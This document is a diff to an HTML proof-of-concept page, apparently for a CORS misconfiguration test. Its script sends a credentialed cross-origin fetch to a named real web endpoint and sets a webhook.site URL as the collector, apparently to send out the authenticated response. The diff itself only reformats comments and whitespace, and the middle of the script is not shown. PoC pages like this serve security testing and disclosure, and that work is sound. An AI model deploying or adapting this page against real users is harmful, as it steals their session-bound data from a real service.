@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+  <!DOCTYPE html>
   <html lang="en">
   <head>
   <meta charset="UTF-8">
@@ -19,24 +19,28 @@
   <pre id="log"></pre>
 
   <script>
-    // ---------------------------------------------------------------
-    // Configuration – edit only these two lines if needed
-    // ---------------------------------------------------------------
+    /* --------------------------------------------------------------
+       Configuration – edit only these two lines if needed
+       -------------------------------------------------------------- */
     var TARGET_URL   = 'https://web-edge.clearme.com/';          // 
   endpoint to test
     var COLLECTOR    =
   'https://webhook.site/9b73a4e3-5b36-4493-9eaa-f81197d7f937'; // <-- YOUR
   webhook URL
-    // ---------------------------------------------------------------
+    /* -------------------------------------------------------------- */
 
-    // Helper to append text to the <pre> box
+    /* --------------------------------------------------------------
+       Helper: append text to the <pre> box
+       -------------------------------------------------------------- */
     function log(msg) {
       var el = document.getElementById('log');
-      el.textContent += msg + '\n';
+      el.textContent = el.textContent + msg + '\n';
       el.scrollTop = el.scrollHeight; // keep newest lines visible
     }
 
-    // Perform the cross‑origin request with credentials
+    /* --------------------------------------------------------------
+       Perform the cross‑origin request with credentials
+       -------------------------------------------------------------- */
     fetch(TARGET_URL, {
       method: 'GET',
       credentials: 'include',   // <-- sends cookies (will be empty if not
@@ -81,6 +85,6 @@
   with credentials.');
     });
   </script>
-  
+
   </body>
   </html>
